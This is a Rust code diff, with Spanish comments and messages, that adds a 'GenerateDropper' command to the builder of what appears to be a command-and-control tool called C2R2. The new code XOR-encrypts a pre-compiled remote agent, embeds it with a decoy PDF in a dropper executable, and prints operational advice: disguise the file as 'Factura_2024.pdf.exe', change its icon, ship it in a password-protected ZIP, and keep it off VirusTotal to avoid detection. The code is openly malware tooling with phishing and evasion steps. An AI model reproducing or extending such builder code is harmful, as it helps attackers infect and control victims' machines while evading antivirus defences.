@@ -3,6 +3,7 @@
 mod dll_encrypt;
 mod encrypt;
 mod patch;
+mod sc_generator;
 
 use clap::{Parser, Subcommand};
 use dll_encrypt::{encrypt_dll, generate_random_key, xor_encrypt};
@@ -59,7 +60,7 @@ enum Commands {
         module: String,
     },
 
-    /// Genera un dropper con shellcode embebido
+    /// Genera un dropper con shellcode embebido (requiere donut + Rust)
     BuildDropper {
         /// Archivo de shellcode (.bin generado por donut)
         #[arg(short, long)]
@@ -72,6 +73,26 @@ enum Commands {
         /// Nombre del dropper de salida
         #[arg(short, long, default_value = "dropper")]
         output: String,
+    },
+
+    /// Genera un dropper embediendo un agente pre-compilado (NO requiere Rust ni donut)
+    /// Este es el método recomendado para distribución standalone
+    GenerateDropper {
+        /// Archivo agent.exe pre-compilado
+        #[arg(short, long)]
+        agent: PathBuf,
+
+        /// Dropper template pre-compilado (dropper.exe base)
+        #[arg(short, long, default_value = "dropper-rust/dropper.exe")]
+        template: PathBuf,
+
+        /// Archivo de salida
+        #[arg(short, long)]
+        output: String,
+
+        /// Archivo PDF de señuelo (opcional, se embebe en el dropper)
+        #[arg(short, long)]
+        decoy: Option<PathBuf>,
     },
 }
 
@@ -360,6 +381,98 @@ fn main() {
                 }
                 Err(e) => {
                     eprintln!("❌ Error ejecutando cargo: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        }
+
+        Commands::GenerateDropper {
+            agent,
+            template,
+            output,
+            decoy,
+        } => {
+            println!("🔧 C2R2 Standalone Dropper Generator v2.0");
+            println!("📦 Agent: {}", agent.display());
+            println!("📋 Template: {}", template.display());
+            println!("📝 Output: {}.exe", output);
+            if let Some(ref d) = decoy {
+                println!("📄 Decoy PDF: {}", d.display());
+            }
+            println!("{}", "-".repeat(50));
+
+            // Validate agent exists
+            if !agent.exists() {
+                eprintln!("❌ Error: Archivo agent no encontrado: {}", agent.display());
+                eprintln!("\n💡 Primero genera o parchea un agent.exe:");
+                eprintln!("   builder patch-agent --input agent.exe --output mi_agent.exe --server 192.168.1.100:4444");
+                std::process::exit(1);
+            }
+
+            // Validate template exists
+            if !template.exists() {
+                eprintln!(
+                    "❌ Error: Template dropper no encontrado: {}",
+                    template.display()
+                );
+                eprintln!("\n💡 Asegúrate de tener un dropper.exe pre-compilado en dropper-rust/");
+                eprintln!("   O compila uno con: cargo build --release --target x86_64-pc-windows-gnu -p dropper");
+                std::process::exit(1);
+            }
+
+            // Read agent
+            let agent_data = match fs::read(&agent) {
+                Ok(data) => data,
+                Err(e) => {
+                    eprintln!("❌ Error leyendo agent: {}", e);
+                    std::process::exit(1);
+                }
+            };
+            println!("📊 Agent size: {} bytes", agent_data.len());
+
+            // Generate XOR key
+            let xor_key = generate_random_key(32);
+            println!("🔑 Generated XOR key: {} bytes", xor_key.len());
+
+            // Encrypt agent
+            let encrypted_agent = xor_encrypt(&agent_data, &xor_key);
+            println!("🔐 Agent encrypted: {} bytes", encrypted_agent.len());
+
+            // Read template dropper
+            let template_data = match fs::read(&template) {
+                Ok(data) => data,
+                Err(e) => {
+                    eprintln!("❌ Error leyendo template: {}", e);
+                    std::process::exit(1);
+                }
+            };
+            println!("📋 Template size: {} bytes", template_data.len());
+
+            // Create output dropper using sc_generator
+            match sc_generator::generate_standalone_dropper(
+                &template_data,
+                &encrypted_agent,
+                &xor_key,
+                decoy.as_ref(),
+            ) {
+                Ok(dropper_data) => {
+                    let dest_path = format!("{}.exe", output);
+                    if let Err(e) = fs::write(&dest_path, &dropper_data) {
+                        eprintln!("❌ Error escribiendo dropper: {}", e);
+                        std::process::exit(1);
+                    }
+
+                    println!("\n✅ ¡Dropper generado exitosamente!");
+                    println!("📦 Dropper guardado como: {}", dest_path);
+                    println!("📊 Tamaño final: {} bytes", dropper_data.len());
+                    println!("\n📋 Próximos pasos:");
+                    println!("   1. Renombrar a algo convincente: Factura_2024.pdf.exe");
+                    println!("   2. Cambiar icono con Resource Hacker o similar");
+                    println!("   3. Comprimir en ZIP con contraseña para distribución");
+                    println!("   4. ¡NO subir a VirusTotal!");
+                }
+                Err(e) => {
+                    eprintln!("❌ Error generando dropper: {}", e);
                     std::process::exit(1);
                 }
             }
